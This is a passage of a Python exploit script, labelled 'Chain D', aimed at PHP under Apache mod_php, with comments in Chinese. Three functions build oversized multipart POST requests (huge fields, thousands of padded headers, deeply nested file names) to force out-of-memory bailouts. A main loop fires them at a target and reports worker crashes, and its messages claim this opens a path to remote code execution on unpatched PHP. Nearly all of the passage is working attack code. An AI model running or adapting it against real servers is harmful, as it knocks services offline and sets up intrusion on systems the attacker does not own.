    Request 2: multipart 解析期 OOM。
    每个 100KB 字段 -> zend_string + $_POST entry, 200 个字段就 20MB+,
    加上解析期 4 倍放大, 足够打爆默认 128M / 32M。
    """
    boundary = "OOM_TRIGGER"
    num_fields = max(50, (memory_limit_mb * 1024 * 1024) // 100000 + 100)
    field_size = 100000  # 100KB

    parts = []
    for i in range(num_fields):
        val = "X" * field_size
        parts.append(
            "--%s\r\n"
            ''Content-Disposition: form-data; name="v%d"\r\n''
            "\r\n"
            "%s\r\n" % (boundary, i, val)
        )
    parts.append("--%s--\r\n" % boundary)
    body = "".join(parts).encode()

    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n" % (path, host, boundary, len(body))
    ).encode() + body
    return send_request(host, port, req, timeout=60), num_fields, field_size


def step2_trigger_oom_headers(host, port, path, count=20000):
    """
    变体策略 2: 每个 part 塞大量 header, 内存放大 ~4 倍, body 不用很大。
    """
    boundary = "HDR_TRIGGER"
    chunk = []
    for i in range(count):
        chunk.append(
            "--%s\r\n"
            ''Content-Disposition: form-data; name="h%d"\r\n''
            "X-Pad-%d: %s\r\n"
            "\r\n"
            "1\r\n" % (boundary, i, i, "A" * 200)
        )
    chunk.append("--%s--\r\n" % boundary)
    body = "".join(chunk).encode()
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n" % (path, host, boundary, len(body))
    ).encode() + body
    return send_request(host, port, req, timeout=90)


def step2_trigger_oom_files(host, port, path, depth=64, fanout=64):
    """
    变体策略 3: 空 file 控件 + 嵌套 name。
    不占 max_file_uploads, 但嵌套数组在 PHP 里按层分配, 内存开销大。
    """
    boundary = "FILE_TRIGGER"
    parts = []
    for i in range(fanout):
        nested = "".join("[a%d]" % j for j in range(depth))
        parts.append(
            "--%s\r\n"
            ''Content-Disposition: form-data; name="u%s"; filename=""\r\n''
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "\r\n" % (boundary, nested, )
        )
    parts.append("--%s--\r\n" % boundary)
    body = "".join(parts).encode()
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n" % (path, host, boundary, len(body))
    ).encode() + body
    return send_request(host, port, req, timeout=90)


def main():
    ap = argparse.ArgumentParser(description="Chain D: PHP OOM corruption -> RCE (Apache mod_php)")
    ap.add_argument("--target", default="http://127.0.0.1:18081")
    ap.add_argument("--path", default="/example.com")
    ap.add_argument("--memory-limit", type=int, default=32, help="目标 memory_limit (MB)")
    ap.add_argument("--attempts", type=int, default=5)
    ap.add_argument("--mode", choices=["fields", "headers", "files"], default="fields",
                    help="内存放大策略")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("=" * 57)
    print(" Chain D - PHP OOM Corruption -> RCE (Apache mod_php)")
    print("=" * 57)
    print(" Target      : %s" % args.target)
    print(" memory_limit: %dMB" % args.memory_limit)
    print(" mode        : %s" % args.mode)
    print()

    for attempt in range(1, args.attempts + 1):
        print("[Attempt %d/%d]" % (attempt, args.attempts))

        print("  [1] 在 worker 上铺 EG() 状态...")
        resp1 = step1_populate_stale_state(host, port, args.path)
        status1 = resp1.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp1 else "?"
        print("      %s" % status1)

        print("  [2] multipart 解析期触发 OOM...")
        if args.mode == "fields":
            resp2, nf, fs = step2_trigger_oom(host, port, args.path, args.memory_limit)
            print("      已发送 %d 字段 x %dKB" % (nf, fs // 1024))
        elif args.mode == "headers":
            resp2 = step2_trigger_oom_headers(host, port, args.path)
            print("      已发送 大量 header 分片")
        else:
            resp2 = step2_trigger_oom_files(host, port, args.path)
            print("      已发送 嵌套空 file 控件")

        if resp2:
            status2 = resp2.split(b"\r\n", 1)[0].decode("latin1", "replace")
            body2 = resp2.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp2 else b""
            low = body2.lower()
            if b"memory" in low and b"exhausted" in low:
                print("      [+] OOM TRIGGERED!")
                for line in body2.decode("latin1", "replace").split("\n"):
                    if "memory" in line.lower() or "fatal" in line.lower():
                        print("          %s" % line.strip()[:120])
                        break
                print("      -> longjmp() bailout 已执行")
                print("      -> mod_php shutdown 在脏 EG() 上运行")
                print("      -> 未打补丁的 PHP: 堆整形后 EG(user_error_handler) 可控 -> RCE")
                return 0
            elif b"500" in status2.encode():
                print("      [+] 500 Internal Server Error - 很可能就是 OOM")
                return 0
            else:
                print("      %s" % status2)
        else:
            print("      [+] 无响应 - worker 崩了, 说明 OOM bailout 成立")
            return 0
        print()

    print("[-] 没触发 OOM, 把 --memory-limit 调成目标的真实值再试")
    return 1


if __name__ == "__main__":
    sys.exit(main())
